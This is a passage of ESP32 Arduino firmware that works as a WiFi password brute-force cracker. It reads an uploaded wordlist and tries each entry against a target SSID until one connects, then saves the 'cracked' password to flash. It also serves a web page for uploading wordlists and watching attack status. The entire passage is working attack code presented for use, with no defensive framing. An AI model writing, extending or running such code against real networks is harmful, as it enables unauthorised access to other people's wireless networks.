void startAttack() {
  if (targetSSID == "") {
    Serial.println("\n[!] No target selected! Select a network first (option 2 or 3)\n");
    return;
  }
  
  if (!SPIFFS.exists("/passwords.txt")) {
    Serial.println("\n[!] No wordlist uploaded!");
    Serial.println("[!] Use option 4 for web interface instructions\n");
    return;
  }
  
  // Count passwords
  File file = SPIFFS.open("/passwords.txt", "r");
  if (!file) {
    Serial.println("[!] Cannot read wordlist!");
    return;
  }
  
  totalPasswords = 0;
  while (file.available()) {
    String line = file.readStringUntil('\n');
    line.trim();
    if (line.length() > 0) totalPasswords++;
  }
  file.close();
  
  if (totalPasswords == 0) {
    Serial.println("[!] Wordlist is empty!");
    return;
  }
  
  // Start attack
  currentAttempt = 0;
  isRunning = true;
  status = "Attacking: " + targetSSID;
  currentPassword = "";
  lastAttempt = 0;
  
  if (passwordFile) passwordFile.close();
  passwordFile = SPIFFS.open("/passwords.txt", "r");
  
  Serial.println("\n╔══════════════════════════════════════════════╗");
  Serial.println("║            🔥 ATTACK STARTED 🔥              ║");
  Serial.println("╠══════════════════════════════════════════════╣");
  Serial.print("║ Target: ");
  Serial.print(targetSSID);
  for(int i = targetSSID.length(); i < 32; i++) Serial.print(" ");
  Serial.println("║");
  
  Serial.print("║ Wordlist: ");
  Serial.print(totalPasswords);
  Serial.print(" passwords");
  for(int i = String(totalPasswords).length() + 10; i < 32; i++) Serial.print(" ");
  Serial.println("║");
  
  Serial.print("║ Speed: ~");
  Serial.print(1000/ATTEMPT_DELAY);
  Serial.print(" att/sec");
  for(int i = String(1000/ATTEMPT_DELAY).length() + 8; i < 32; i++) Serial.print(" ");
  Serial.println("║");
  
  Serial.println("╚══════════════════════════════════════════════╝\n");
}

void stopAttack() {
  if (isRunning) {
    isRunning = false;
    if (passwordFile) passwordFile.close();
    WiFi.disconnect(true);
    status = "Stopped by user";
    Serial.println("\n[⛔] Attack stopped by user\n");
  } else {
    Serial.println("\n[!] No attack running\n");
  }
}

void showStatus() {
  Serial.println("\n┌─────────────────────────────────────────┐");
  Serial.println("│            STATUS REPORT                │");
  Serial.println("├─────────────────────────────────────────┤");
  
  Serial.print("│ Target: ");
  if (targetSSID == "") {
    Serial.print("Not selected");
    for(int i = 0; i < 24; i++) Serial.print(" ");
  } else {
    Serial.print(targetSSID);
    for(int i = targetSSID.length(); i < 24; i++) Serial.print(" ");
  }
  Serial.println("│");
  
  Serial.print("│ Status: ");
  String shortStatus = status;
  if (shortStatus.length() > 23) shortStatus = shortStatus.substring(0, 20) + "...";
  Serial.print(shortStatus);
  for(int i = shortStatus.length(); i < 23; i++) Serial.print(" ");
  Serial.println("│");
  
  if (isRunning) {
    float percent = (currentAttempt * 100.0) / totalPasswords;
    Serial.print("│ Progress: ");
    Serial.print(currentAttempt);
    Serial.print("/");
    Serial.print(totalPasswords);
    Serial.print(" (");
    Serial.print(percent, 1);
    Serial.print("%)");
    for(int i = String(currentAttempt).length() + String(totalPasswords).length() + 8; i < 23; i++) Serial.print(" ");
    Serial.println("│");
    
    Serial.print("│ Testing: ");
    String pass = currentPassword;
    if (pass.length() > 20) pass = pass.substring(0, 17) + "...";
    Serial.print(pass);
    for(int i = pass.length(); i < 23; i++) Serial.print(" ");
    Serial.println("│");
  } else {
    File f = SPIFFS.open("/passwords.txt", "r");
    if (f) {
      Serial.print("│ Wordlist: ");
      Serial.print(f.size());
      Serial.print(" bytes");
      f.close();
      for(int i = String(f.size()).length() + 7; i < 23; i++) Serial.print(" ");
      Serial.println("│");
    } else {
      Serial.println("│ Wordlist: Not loaded          │");
    }
  }
  
  Serial.println("└─────────────────────────────────────────┘\n");
}

void listFiles() {
  Serial.println("\n┌─────────────────────────────────────────┐");
  Serial.println("│           FILES IN SPIFFS               │");
  Serial.println("├─────────────────────────────────────────┤");
  
  File root = SPIFFS.open("/");
  File file = root.openNextFile();
  bool hasFiles = false;
  
  while (file) {
    hasFiles = true;
    String name = String(file.name());
    if (name.length() > 0 && name != "/") {
      if (name.startsWith("/")) name = name.substring(1);
      Serial.print("│ ");
      Serial.print(name);
      for(int i = name.length(); i < 25; i++) Serial.print(" ");
      Serial.print(file.size());
      Serial.println(" bytes │");
    }
    file = root.openNextFile();
  }
  
  if (!hasFiles) {
    Serial.println("│           No files found               │");
  }
  
  Serial.println("└─────────────────────────────────────────┘\n");
}

void deleteWordlist() {
  if (SPIFFS.exists("/passwords.txt")) {
    if (SPIFFS.remove("/passwords.txt")) {
      Serial.println("\n[✓] Wordlist deleted successfully\n");
    } else {
      Serial.println("\n[!] Failed to delete wordlist\n");
    }
  } else {
    Serial.println("\n[!] No wordlist found\n");
  }
}

// ============= BRUTE FORCE LOOP =============
void bruteForceLoop() {
  if (!isRunning) return;
  
  if (millis() - lastAttempt < ATTEMPT_DELAY) return;
  lastAttempt = millis();
  
  if (!passwordFile || !passwordFile.available()) {
    if (passwordFile) passwordFile.close();
    isRunning = false;
    status = "Completed - Password not found";
    Serial.println("\n╔══════════════════════════════════════════════╗");
    Serial.println("║         ❌ ATTACK FAILED ❌                 ║");
    Serial.println("║     Password not found in wordlist         ║");
    Serial.println("╚══════════════════════════════════════════════╝\n");
    return;
  }
  
  currentPassword = passwordFile.readStringUntil('\n');
  currentPassword.trim();
  
  if (currentPassword.length() == 0) return;
  
  currentAttempt++;
  status = "Testing: " + currentPassword;
  
  // Show progress every 20 attempts
  if (currentAttempt % 20 == 0) {
    float percent = (currentAttempt * 100.0) / totalPasswords;
    Serial.printf("[%d/%d] %.1f%% - Testing: %s\n", 
      currentAttempt, totalPasswords, percent, currentPassword.c_str());
  }
  
  // Quick connection attempt
  WiFi.begin(targetSSID.c_str(), currentPassword.c_str());
  
  int timeout = 15;
  bool connected = false;
  
  for (int i = 0; i < timeout; i++) {
    delay(100);
    if (WiFi.status() == WL_CONNECTED) {
      connected = true;
      break;
    }
    server.handleClient();
  }
  
  if (connected) {
    if (passwordFile) passwordFile.close();
    isRunning = false;
    
    status = "SUCCESS! Password: " + currentPassword;
    
    Serial.println("\n╔══════════════════════════════════════════════╗");
    Serial.println("║         🎉 PASSWORD FOUND! 🎉               ║");
    Serial.println("╠══════════════════════════════════════════════╣");
    Serial.print("║ SSID: ");
    Serial.print(targetSSID);
    for(int i = targetSSID.length(); i < 32; i++) Serial.print(" ");
    Serial.println("║");
    
    Serial.print("║ Password: ");
    Serial.print(currentPassword);
    for(int i = currentPassword.length(); i < 28; i++) Serial.print(" ");
    Serial.println("║");
    
    Serial.print("║ Attempts: ");
    Serial.print(currentAttempt);
    Serial.print("/");
    Serial.print(totalPasswords);
    for(int i = String(currentAttempt).length() + String(totalPasswords).length() + 1; i < 26; i++) Serial.print(" ");
    Serial.println("║");
    
    Serial.println("╚══════════════════════════════════════════════╝\n");
    
    // Save results
    File result = SPIFFS.open("/cracked.txt", "w");
    if (result) {
      result.println("=== CRACKED NETWORK ===");
      result.print("SSID: "); result.println(targetSSID);
      result.print("Password: "); result.println(currentPassword);
      result.print("Attempts: "); result.println(currentAttempt);
      result.close();
    }
    
    delay(5000);
    WiFi.disconnect(true);
    
  } else {
    WiFi.disconnect(true);
  }
}

// ============= WEB INTERFACE =============
void setupWebRoutes() {
  server.on("/", HTTP_GET, []() {
    String html = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ESP32 WiFi Brute Force</title>
  <style>
    body {
      background: #0a0a0a;
      color: #00ff41;
      font-family: 'Courier New', monospace;
      padding: 20px;
    }
    .container { max-width: 600px; margin: 0 auto; }
    .box {
      background: #111;
      border: 2px solid #00ff41;
      border-radius: 10px;
      padding: 20px;
      margin: 10px 0;
    }
    h1 { text-align: center; }
    input, button {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      background: #000;
      border: 1px solid #00ff41;
      color: #00ff41;
      font-family: 'Courier New', monospace;
      font-size: 14px;
    }
    button {
      cursor: pointer;
      font-weight: bold;
    }
    button:hover {
      background: #00ff41;
      color: #000;
    }
    .status {
      background: #000;
      padding: 15px;
      border-left: 4px solid #00ff41;
      font-family: monospace;
      word-break: break-all;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🔓 ESP32 WiFi Brute Force</h1>
    <div class="box">
      <h3>📁 Upload Password Wordlist</h3>
      <form id="uploadForm" enctype="multipart/form-data">
        <input type="file" name="file" accept=".txt" required>
        <button type="submit">📤 UPLOAD</button>
      </form>
      <div id="uploadStatus" style="margin-top:10px;"></div>
    </div>
    <div class="box">
      <h3>📊 Status</h3>
      <div class="status" id="status">Idle</div>
    </div>
  </div>
  <script>
    document.getElementById('uploadForm').onsubmit = async (e) => {
      e.preventDefault();
      const formData = new FormData(e.target);
      const uploadStatus = document.getElementById('uploadStatus');
      uploadStatus.innerHTML = 'Uploading...';
      const res = await fetch('/upload', { method: 'POST', body: formData });
      const text = await res.text();
      uploadStatus.innerHTML = '<span style="color:#00ff41;">✓ ' + text + '</span>';
      setTimeout(() => { uploadStatus.innerHTML = ''; }, 3000);
    };
    
    setInterval(async () => {
      const res = await fetch('/status');
      const data = await res.json();
      document.getElementById('status').innerHTML = data.status;
    }, 1000);
  </script>
</body>
</html>
)rawliteral";
    server.send(200, "text/html", html);
  });
  
  server.on("/upload", HTTP_POST, []() {
    server.send(200, "text/plain", "Wordlist uploaded! Use option 5 to start attack");
  }, handleUpload);
  
  server.on("/status", HTTP_GET, []() {
    StaticJsonDocument<512> doc;
    doc["status"] = status;
    String response;
    serializeJson(doc, response);
    server.send(200, "application/json", response);
  });
}

void handleUpload() {
  HTTPUpload& upload = server.upload();
  static String filename;
  
  if (upload.status == UPLOAD_FILE_START) {
    filename = "/passwords.txt";
    SPIFFS.remove(filename);
    Serial.println("[WEB] Upload started");
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    File file = SPIFFS.open(filename, "a");
    if (file) {
      file.write(upload.buf, upload.currentSize);
      file.close();
    }
  } else if (upload.status == UPLOAD_FILE_END) {
    Serial.println("[WEB] Wordlist uploaded successfully");
  }
}
